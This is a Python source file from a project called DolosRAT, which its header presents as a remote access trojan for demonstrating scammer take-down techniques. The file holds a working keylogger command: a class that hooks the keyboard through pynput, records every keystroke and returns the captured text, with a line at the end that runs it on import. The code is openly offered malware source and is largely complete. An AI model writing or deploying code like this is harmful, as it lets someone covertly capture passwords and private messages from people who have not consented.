# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 20/07/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
from builtins import getattr
from typing import Any, List

# Modules.
from command import Command

class KeystrokeLogCommand(Command):
    """_summary_

    Args:
        Command (_type_): _description_
    """

    def __init__(self: object) -> Any:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            Any: _description_
        """

        # Initialise from Command parent.
        super().__init__()

        # Create list of imported dependencies.
        self.create_deps('pynput.keyboard')

    def execute(self: object) -> Any:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            Any: _description_
        """

        # Create list for entered keys.
        captured_keys: List[str] = []

        def get_char(key: Any) -> str:
            """_summary_

            Returns:
                str: _description_
            """
            
            key_char = ''
            
            try:
                key_char = key.char
            except AttributeError:
                key_char = str(key)
            finally:
                return key_char
            
        def on_press(key: Any) -> None:
            """_summary_

            Args:
                key (Any): _description_
            """
            
            key_enum = getattr(self.get_dep('pynput.keyboard'), 'Key')
            key_press = ''
            
            match key:
                case key_enum.space:
                    key_press = ' '
                case key_enum.enter:
                    key_press = '\n'
                case key_enum.tab:
                    key_press = '\t'
                case _:
                    key_press = get_char(key)

            captured_keys.append(key_press)

        # Create keyboard capture, and set on_press to closure.
        with getattr(self.get_dep('pynput.keyboard'), 'Listener')(on_press) as key_capture:
            key_capture.join()

        return "".join(captured_keys)

test = KeystrokeLogCommand().execute()
print(test)